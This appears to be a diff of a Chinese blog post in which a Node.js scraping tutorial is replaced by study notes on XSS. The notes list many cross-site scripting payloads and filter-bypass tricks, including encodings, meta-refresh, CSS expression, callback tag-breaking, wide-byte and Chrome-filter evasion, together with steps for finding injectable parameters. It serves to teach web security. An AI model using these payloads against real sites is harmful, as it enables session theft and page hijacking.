@@ -1,133 +1,350 @@
 ---
 layout: post
-title: NodeJS写个爬虫
-description: 这两天看了好几篇不错的文章，有的时候想把好的文章 down 下来放到 kindle 上看，便写了个爬虫脚本，因为最近都在搞 node，所以就很自然的选择 node 来爬咯～
+title: xss零碎指南
+description:该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。
 category: blog
-tags: javascript node spider 爬虫
+tags: xss
 ---
 
-这两天看了好几篇不错的文章，有的时候想把好的文章 down 下来放到 kindle 上看，便写了个爬虫脚本，因为最近都在搞 node，所以就很自然的选择 node 来爬咯～
+该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。
 
-本文地址：{{ site.url }}{{ page.url }}，转载请注明源地址。
+## 一、XSS学习提要
 
-所谓爬虫，可以简单理解为利用程序操作文件，只是这些文件不在本地，需要我们拉取过来。
+1. http://qdemo.sinaapp.com/ppt/xss/ 三水清
+   简单介绍 xss
+2. http://drops.wooyun.org/tips/689  乌云
+   xss与字符编码
+3. http://www.wooyun.org/whitehats/心伤的瘦子
+   系列教程
+4. http://ha.ckers.org/xss.html
+   反射性XSS详细分析和解释
+5. http://html5sec.org/
+   各种技巧 ★★★★★
+6. http://www.80sec.com/
+   一些不错的文章
 
-## 一. 爬虫代码解析
 
-### 1. 拿到目标页码源码
+## 二、XSS攻击要点
 
-Node 提供了很多接口来获取远程地址代码，就拿 AlloyTeam 的页面举例吧，把他首页几篇文章的信息爬取过来。因为 AlloyTeam 使用的协议是 http:// ，本文就不介绍 Node 中 https:// 的使用了。
+注意：这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。
 
-    var http = require("http");
+**1. document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口。**
     
-    var url = "http://www.alloyteam.com/";
-    var data = "";
+**2. html实体编码**
+
+    > "alert(1)".replace(/./g, function(s){
+         return "&#" + s.charCodeAt(0)
+          /*.toString(16) 转换成16进制也可以滴*/
+          + ";"
+      });
     
-    // 创建一个请求
-    var req = http.request(url, function(res){
-        // 设置显示编码
-        res.setEncoding("utf8");
-        // 数据是 chunked 发送，意思就是一段一段发送过来的
-        // 我们使用 data 给他们串接起来
-        res.on('data', function(chunk){
-            data += chunk;
-        });
-        // 响应完毕时间出发，输出 data
-        res.on('end', function(){
-            // dealData(data);
-            console.log(data);
-        });
-    });
+    > "&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"
     
-    // 发送请求
-    req.end();
+    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" />
+    
+**3. 如果过滤 html 实体编码，可以改成URL编码**
 
-上面短短七八行代码，就拿到了 AlloyTeam 首页的代码，真的十分简单，如果是 https:// 就得引用 https 模块咯，都是差不多的。
+    > encodeURIComponent("&#")
+    > "%26%23"
+    
+**4. 利用 HTML5 新增字符**
+    
+    &colon; 冒号
+    &NewLine; 换行
+    
+    <a href="javascr&NewLine;ipt&colon;alert(1)">XSS</a>
+    
+**5. JS进制转换**
+    
+    > "\74\163\143\162\151\160\164\76\141\154\145\162\164\50\61\51\74\57\163\143\162\151\160\164\76"
+    > "<script>alert(1)</script>"
+    
+**6. Base64转换**
 
-### 2. 正则提取目标内容
+    > base64("<script>alert(1)</script>");
+    > PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+    
+    <a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>
+    
+**7. 浏览器解析非严格性**
 
-先看下我们要抓取的内容：
-![alloyteam](/images/blog-article-images/blog/spider-alloyteam.png)
+    <img src=image.jpg title="Hello World" class=test>
+      ↓ ↓    ↓        ↓      ↓            ↓
+      ① ②    ③        ④      ⑤            ⑥
+      
+①中可插入 NUL字符（0x00）
+②和④中空格可以使用 tab（0x0B）与换页键（0x0C），②还可以使用 / 替换
+⑤中的"在IE中也可替换成`。
 
-由于没有使用其他库，我们没办法像操作 DOM 一样获取目标内容，不过写正则也挺简单的，比如我们要 获取标题/文章链接/摘要 这些内容，正则表达式为：
 
-    // function dealData
-    var reg = /<ul\s+class="articlemenu">\s+<li>\s+<a[^>]*>.*?<\/a>\s+<a href="(.*?)"[^>]*>(.*?)<\/a>[\s\S]*?<div\s+class="text">([\s\S]*?)<\/div>/g;
-    var res = [];
-    while(match = reg.exec(data)) {
-        res.push({
-            "url": match[1],
-            "title": match[2],
-            "excerpt": match[3]
-        });
+       位置     |        代码            | 可能插入或替代的代码
+    ------------|--------------------------|-----------------------
+    <的右边     | <[here]a href="...      | 控制符，空白符，非打印字符
+    a标签的后门 | <a[here]href="...        | 同上
+    href属性中间| <a hr[here]ef="...       | 同上+空字节
+    =两边       | <a href[here]=[here]"... | 所有字符
+    替换=       | <a href[here]"...        | Union编码符号
+    替换"       | <a href=[here]…[here]>   | 其他引号
+    >之前       | <a href="…"[here]>       | 任意字符
+    /之前       | <a href="…">...<[here]/a>| 空白符，控制符
+    /之后       | <a href="…">...</[here]a>| 空白符，控制符
+    >闭合之前   | <a href="…">…</a[here]>  | 所有字符
+
+
+
+**8. 斜杠**
+
+在字符串中斜杠（/）可以用于转义字符，比如转义 " 和 ' ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。
+
+**9. 空格的处理方式**
+
+在解析的时候空格被转移成 `&nbsp;`,注入的时候可以使用 `/**/`来替换。
+
+**10. 特殊属性**
+
+1）srcdoc属性（chrome有效）
+
+    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+
+2）autofoucus
+
+    <input onfocus=write(1) autofocus>
+
+3）object
+
+    <object classid="clsid:333c7bc4-460f-11d0-bc04-0080c7055a83">
+        <param name="dataurl" value="javascript:alert(1)">
+    </object>
+
+**11.绕过浏览器过滤（crhome）**
+
+    ?t="><img src=1 onerror=alert(1)>
+    <input type="hidden" id="sClientUin" value="{{t}}">
+
+    浏览器会过滤onerror中的代码，所以换种方式注入
+
+    ?t="><script src="data:text/html,<script>alert(1)</script><!--
+
+chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。
+
+**12.替换URL**
+    
+    <xss style="behavior: url(xss.htc);">
+    <style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>
+    <style type="text/css">body{background:url("javascript:alert('xss')")}</style>
+
+**13.抓包、换包*
+
+
+## 三、XSS攻击方式
+
+**1. javascript:和vbscript:协议执行后的结果将会映射在DOM**后面。
+
+    <a href="javascript:'\x3cimg src\x3dx onerror=alert(1)>'">click me</a>
+
+**2. 变量覆盖**
+
+    <form id="location" href="bar">
+    <script>alert(location.href)</script>
+    
+**3. meta标签**
+
+    <meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)">
+    Javascript: 协议可能被禁止，可以使用 data:
+    <meta http-equiv="refresh" content="0; url=data:text/html,<script>alert(1)</script>">
+
+**4. css注入**
+
+    <style>
+    @import "data:,*%7bx:expression(write(1))%7D";
+    </style>
+    <style>
+    @imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; </style>
+    <style>
+    <link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d">
+
+**5. 提前闭合标签**
+
+    http://example.com/test.php?callback=cb
+
+    缺陷代码：
+    <script type='text/javascript'>
+        document.domain='soso.com';
+        _ret={"_res":2};
+        try{
+            parent.aaa(_ret);
+        }catch(err){
+            aaa(_ret);
+        }
+    </script>
+
+    注入：http://example.com/test.php?callback=cb</script><script>alert("XSS")</script>
+
+原理：
+cb为回调函数，如果后端并没有对callback字段进行过滤，则可以`cb</script><script>alert("XSS")</script>`这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。
+
+**6. 提前闭合双引号**
+
+    <input type="text" value="XSS&quot; onclick=&quot;alert(1)" />
+
+    <!--<img src="--><img src=x onerror=alert(1)//">
+    <comment><img src="</comment><img src=x onerror=alert(1)//">
+    <![><img src="]><img src=x onerror=alert(1)//">
+    <style><img src="</style><img src=x onerror=alert(1)//">
+
+**7. 阻止编码**
+
+    ?t=;alert(1)
+    <script type="text/javascript">
+        var t = query(t); // t = "&quot;;alert(1)"
+    </script>
+
+上面可以看到 ";" 被编码了，观察页面编码：
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=gb18030" />
+
+gbxxx系列编码，可以尝试宽字节：
+
+    ?t=%c0%22alert(1)
+
+**8. 攻击单行注释**
+
+URL对应的param中添加换行符（%0a）或者其他换行符。
+
+    ?t=%0aalert(1)//
+
+    // init('id', "%0aalert(1)//");
+
+    被解析成
+
+    // init('id', "
+    alert(1)//");
+
+**9. url**
+
+url中可以使用很多协议 http:// https:// javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。
+
+    <a href="data:text/html,<script>alert(1)</script>">XSS</a>
+
+**10. Flash跨域注入**
+
+这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。
+
+**11. 利用事件**
+    
+    <iframe src=# onmouseover="alert(document.cookie)"></iframe>
+
+**12. 利用标签**
+    
+    <table><td background="javascript:alert('xss')">
+
+
+
+## 四、XSS攻击实质
+
+XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。
+
+**1. 绕过过滤**
+
+URL中的 `<`，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成`&lt;`，也可以使用 \x3c (Javascript 16进制编码)，`>` 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。
+
+所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。
+
+1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。
+2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。
+
+
+**2. 利用源码中js的解析**
+
+比如第二部分提出的第11点，浏览器的拦截
+
+    
+    ?t="><script>alert(1)</script>
+
+这样的插入会被拦截，当你发现源码中有这么一句话的时候：
+
+    function parseURL(){
+        //...
+        t.replace("WOW", "");
+        //..
     }
 
+便可以修改如上参数：
 
-这里的正则看起来有点晦涩，不过呢，正则在编程中十分基础的东西，如果没有太多的了解，建议先去搞清楚，这里就不细说啦。这里要强调的一点是：
+    ?t="><scrWOWipt>alert(1)</scrWOWipt>
 
-    reg.exec(data);
-
-如果只写上面这句话，只会拿到第一个匹配结果，所以需要使用 while 循环来处理，没处理一次，正则匹配的位置就会往后推一下。其实上面这条语句执行后返回的是一个对象，其中包含一个 index 属性，具体可以查阅 JavaScript 正则的内容。
-
-这里返回（res）的数据格式是：
-
-    [{
-        "url: url,
-        "title": title,
-        "excerpt" excerpt
-    }];
-
-### 3. 数据的过滤
-
-上面虽然拿到了内容，不过我们需要的是纯文本，其他标签什么的得过滤掉，excerpt 中包含了一些标签：
-
-    var excerpt = excerpt.replace(/(<.*?>)((.*?)(<.*?>))?/g, "$3");
-
-虽说文章中有很多代码，有些标签是不应该删除的，不过这里是摘要内容，这些内容的标签都删除掉，方便我们储存。然后把长度处理下：
-
-    excerpt = excerpt.slice(0, 120);
-
-### 4. 存到数据库（或者文件）
-
-我这里是把文件储存到文件之中，存放格式为：
-
-    [title](url)
-    > excerpt
-
-哈哈，很熟熟悉吧，markdown 语法，看起来也比较清晰。
-
-    var str = "";
-    for(var i = 0, len = data.length; i < len; i++){
-        str += "[" + data[i].title + "](" + data[i].url + ")\n" + data[i].excerpt.replace("\n\s*\n?", ">\n") + "\n\n";
-    }
-
-先拼接数据，然后写入到文件：
-
-    fs.writeFile('index.md', str, function (err) {
-        if (err) throw err;
-        console.log('数据已保存～');
-    });
-
-大功告成，过程其实是很简单的。拿到的内容：
-
-![alloyteam](/images/blog-article-images/blog/spider-alloyteam-res.png)
+直接绕过了chrome浏览器对危险代码的防御。
 
 
-## 二. 小结
+## 五、学会XSS攻击
 
-如果对正则不太熟悉，上面的工作是不太好完成的，很多开发者为 Node 提供了工具库，使用 npm 可以安装，如果不习惯正则，使用一些工具包辅助处理，可以把拿到的数据当作 DOM 来解析。
+**1. 寻找可控参数**
 
-我了解到的有一个叫做 node-jquery 的库貌似还不错，具体请读者自己去网上搜吧，应该挺多的。
+攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。
 
-## 三. 参考资料
+- 含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中
+- 实验各种字符（< , > " '等），判断是否被过滤，测试方式，手动输入测试
+- 确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等
 
-- <http://nodejs.org/api/fs.html>
-- <http://nodejs.org/api/http.html>
+**2. 开始注入**
+
+注入细节上面都是，基本的思维模式：
+
+- 覆盖
+- 阻断
+- 利用特性
+
+**3. 修补注入错误**
+
+注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确
+
+**4. 开搞**
+测试的时候alert(1),弹出成功再继续其他更邪恶的注入方式。
 
 
+## 六、XSS分类
+
+为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。
+
+存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：
+
+反射型是：输入--输出；<br />
+存储型是：输入--进入数据库*--取出数据库--输出。
+
+这样一来，大家应该注意到以下差别：
+
+反射型是：绝大部分情况下，输入在哪里，输出就在哪里。<br />
+存储型是：输入在A处进入数据库， <br />而输出则可能出现在其它任何用到数据的地方。
+
+反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）
+存储型是：输入大部分来自POST/<br />GET请求，常见于一些保存操作中。
+
+因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。
 
 
+## 七、辅助工具
 
+1. http://ha.ckers.org/xsscalc.html
+2. chrome插件 （xss Encode，百度之）
+3. 抓包工具，[fiddler4](http://www.telerik.com/download/fiddler)  [chales](http://www.charlesproxy.com/latest-release/download.do)
+4. 白名单过滤工具[github/js-xss](https://github.com/leizongmin/js-xss)
 
+## 八、小结
 
+简单小结：
 
+- & 号不应该出现在HTML的大部分节点中。
+- 括号<>是不应该出现在标签内的，除非为引号引用。
+- 在ext节点里面，<左尖括号有很大的危害。
+- 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。
+- 。。。
+
+关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。
+
+## 九、参考资料
+
+- <http://drops.wooyun.org/tips/689>
+- <http://drops.wooyun.org/tips/147>
+- <http://www.web-tinker.com/article/20468.html>
+- <http://www.wooyun.org/whitehats/心伤的瘦子>
+- <https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>
